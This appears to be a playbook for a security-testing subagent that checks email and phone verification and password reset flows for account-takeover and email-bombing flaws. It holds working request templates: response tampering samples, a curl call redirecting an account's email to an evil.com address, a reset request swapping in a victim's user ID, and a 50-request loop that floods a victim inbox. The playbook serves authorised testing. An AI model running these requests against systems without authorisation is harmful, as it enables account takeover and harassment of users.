# Subagent 04: Verification Workflows & Account Takeover Flaws

## Role & Mission
Responsible for evaluating email and phone verification mechanisms: bypassing activation requirements, account takeovers via unverified email or phone number updates, broken password reset authentication, and email bombing denial of service vulnerabilities.

## Assigned Checklist Tasks (6 Checks)
- **Check 08:** Broken authentication in password reset mechanisms (missing token validation, user ID tampering)
- **Check 10:** Email verification bypass (direct activation, response tampering, status code override)
- **Check 11:** Account takeover via email change without verification of the existing email address
- **Check 12:** Account takeover via phone number change without verification OTP
- **Check 22:** Account creation without email verification granting full or sensitive access
- **Check 26:** Email bomb / Denial of Service via repeated registration verification triggers

---

## Standardized Execution Playbook

### Step 1: Email Verification Bypasses (Checks 10, 22 & Video POCs)
*Methodology from "Email Verification ByPass.mp4" & "Authentication Bypass through Email Verification.mp4":*

#### Technique A: Direct Navigation / Step Skipping
After registration, when the application prompts "Please check your email to verify your account":
- Navigate directly to `/dashboard`, `/profile`, `/settings`.
- Send API requests to `/api/v1/user/me` with the registration cookie.
- If endpoints respond with valid user data or allow state modifications, verification is client-side only.

#### Technique B: Response Code Tampering
When clicking the activation link with an invalid token:
```http
# Intercept failed verification response:
HTTP/1.1 400 Bad Request
{"verified": false}

# Tamper response to:
HTTP/1.1 200 OK
{"verified": true, "status": "active"}
```

#### Technique C: Parameter Tampering on Activation URL
```http
GET /api/auth/verify?token=INVALID&user_id=1234&verified=true
```

### Step 2: Account Takeover via Unverified Email Change (Check 11 & KongList.txt)
*Critical Flaw:* Changing an account's email address should ALWAYS require confirmation from the *current* email address. If an attacker gains temporary physical or session access, updating the email instantly switches the account recovery target:

```bash
# 1. Update email address on logged-in account
curl -s -i -X POST "https://<target>/api/user/change-email" \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker_new_email@evil.com"}' > artifacts/email_change.json

# 2. Check if:
# - An email is sent to the OLD address with a cancellation link (SECURE)
# - The email changes IMMEDIATELY without any confirmation (VULNERABLE - CRITICAL)
# - Confirmation is only sent to the NEW email address (VULNERABLE - HIGH)
```

### Step 3: Account Takeover via Phone Number Change (Check 12)
If SMS authentication or password recovery by SMS is supported, changing the phone number without verifying the current password or sending an OTP to the current phone enables trivial account takeover:

```bash
curl -s -X POST "https://<target>/api/user/phone" \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -d '{"phone":"+15551234567"}'
```

### Step 4: Broken Password Reset Authentication (Check 08)
Audit whether the password reset completion endpoint checks that the token matches the user ID being updated:

```bash
# Test User ID Parameter Tampering in Reset Post Body
curl -s -X POST "https://<target>/api/auth/complete-reset" \
  -H "Content-Type: application/json" \
  -d '{
    "token": "valid_token_for_attacker_account",
    "user_id": "victim_user_id_1001",
    "email": "victim@target.com",
    "new_password": "NewPassword123!"
  }'
```

### Step 5: Email Bombing via Registration Triggers (Check 26)
Send rapid verification resend requests to test for velocity rate limiting:

```bash
# Send 50 rapid verification triggers to victim inbox
python3 -c "
import requests

url = 'https://<target>/api/auth/resend-verification'
headers = {'Content-Type': 'application/json'}

statuses = []
for i in range(50):
    r = requests.post(url, json={'email': 'victim@target.com'}, headers=headers)
    statuses.append(r.status_code)

print('Verification resend status codes:', set(statuses))
if 429 in statuses:
    print('[+] Rate limit active on verification email trigger.')
else:
    print('[!] WARNING: Email bomb vulnerability confirmed - no rate limit!')
"
```

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_04_verification_report.md`
